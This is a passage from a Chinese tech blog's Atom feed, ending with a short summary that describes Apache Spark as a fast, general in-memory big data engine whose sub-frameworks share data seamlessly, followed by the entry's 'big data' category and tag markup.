&lt;p&gt;Spark 是一种基于内存的快速、通用、可扩展的大数据分析计算引擎。在 FullStack 理想的指引下，&lt;strong&gt;Spark 中的 Spark SQL 、SparkStreaming 、MLLib 、GraphX 、R 五大子框架和库之间可以无缝地共享数据和操作&lt;/strong&gt;， 这不仅打造了 Spark 在当今大数据计算领域其他计算框架都无可匹敌的优势， 而且使得 Spark 正在加速成为大数据处理中心首选通用计算平台。&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
</feed>
